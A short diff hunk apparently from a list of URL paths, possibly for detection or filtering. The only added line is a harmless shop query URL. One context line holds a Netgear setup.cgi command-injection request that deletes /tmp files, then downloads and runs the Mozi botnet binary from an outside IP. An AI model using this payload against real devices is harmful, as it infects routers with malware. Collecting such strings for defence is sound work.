@@ -13702,3 +13702,4 @@ srv57c0d2365c3c.korsan.me:443
 /backup.sql.tar.z
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.8.24.167:43648/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /figs-loso-gold-figs-30-50-cm?tag=cm&sort=rating&order=ASC
+/figs-loso-gold-figs-30-50-cm?tag=Gold&sort=rating&order=ASC
